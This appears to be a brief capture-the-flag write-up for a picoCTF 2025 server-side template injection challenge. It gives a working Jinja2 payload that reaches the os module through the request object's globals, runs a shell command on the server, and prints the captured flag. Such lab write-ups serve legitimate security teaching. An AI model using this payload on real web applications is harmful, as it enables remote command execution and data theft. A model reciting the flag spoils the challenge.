- Author: Venax

Description

I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.

I heard templating is a cool and modular way to build web apps! Check out my website here!

_________________________________________________________________________________________

Follow here https://mosec0.medium.com/picoctf-2025-ssti1-ctf-writeup-a5bf0d4977b5

Solution:
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

It does cat flag to cat out the content of the flag


```bash
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```
